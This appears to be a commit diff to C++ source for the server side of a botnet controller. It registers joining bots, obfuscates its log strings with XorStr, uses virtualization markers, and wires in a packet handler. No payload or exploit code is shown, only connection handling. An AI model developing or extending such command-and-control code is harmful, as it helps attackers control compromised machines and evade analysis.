@@ -1,4 +1,7 @@
 #include "consock.h"
+
+#include "packet_handler.h"
+
 bool net::c_consock::init_port()
 {
 	this->server_instance = new CTCPServer(
@@ -62,7 +65,7 @@ void net::c_consock::connector()
 		net::c_consock::Instance().connections.push_back(construct);
 		
 		dbglog(XorStr("[ new bot joined, identity: %llu, %04x ]\n"), construct->identity, (uint32_t)client_socket);
-
+		//TODO:: give bot identity in exch
 		auto exch_packet = FS_packets::s_exch();
 		exch_packet.opcode = FS_packets::OP_EXCH;
 		exch_packet.size = sizeof(decltype(exch_packet));
@@ -89,7 +92,9 @@ void net::c_consock::connector()
 				{
 					this->destroy(client_identity);
 					return;
-				}				
+				}
+
+				net::c_packet::Instance().fc_handler(client_identity, client_socket);
 			
 				/*char buf[256];
 				auto bytes_rcv = this->server_instance->Receive(client_socket, buf, 256);
@@ -98,7 +103,7 @@ void net::c_consock::connector()
 			
 				dbglog(XorStr("[ rcv from %llu, %s ]\n"), client_identity, buf);*/
 
-		}), 0, construct->identity, client_socket));
+		}), 100, construct->identity, client_socket));
 	}
 	vmend;
 }
@@ -112,7 +117,7 @@ bool net::c_consock::destroy(ULONGLONG uid)
 		if (!obj || obj->identity != uid) continue;
 		this->connections.erase(this->connections.begin() + i);
 		delete obj;
-		dbglog(XorStr("[ dropped connection of client %08x ]\n"), uid);
+		dbglog(XorStr("[ dropped connection of client %llu ]\n"), uid);
 		break;
 	}
 
